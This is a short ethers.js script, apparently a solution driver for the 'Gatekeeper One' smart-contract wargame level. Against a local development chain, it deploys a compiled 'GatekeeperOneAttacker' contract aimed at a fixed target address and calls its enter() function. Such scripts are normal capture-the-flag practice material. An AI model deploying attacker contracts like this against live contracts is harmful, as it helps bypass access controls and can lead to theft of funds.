const { ethers } =  require("ethers"); 
const fs = require('fs');

const url = "http://localhost:8545";

const provider = new ethers.providers.JsonRpcProvider(url);

// Getting the accounts
const signer = provider.getSigner(19);

contract_address = "0x4432Ac580b4147D8EcD7cfeAfab98564D9881632"

const metadata = JSON.parse(fs.readFileSync('../artifacts/contracts/GatekeeperOneAttacker.sol/GatekeeperOneAttacker.json').toString())

attackerFactory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer)


;(async () => {
    price = ethers.utils.formatUnits(await provider.getGasPrice(), 'gwei')
    deployOptions = {gasLimit: 1000000, gasPrice: ethers.utils.parseUnits(price, 'gwei')}

    attackerContract = await attackerFactory.deploy(contract_address, deployOptions)
    await attackerContract.deployTransaction.wait()

    tx = await attackerContract.enter();
    await tx.wait();
    console.log(tx)
})();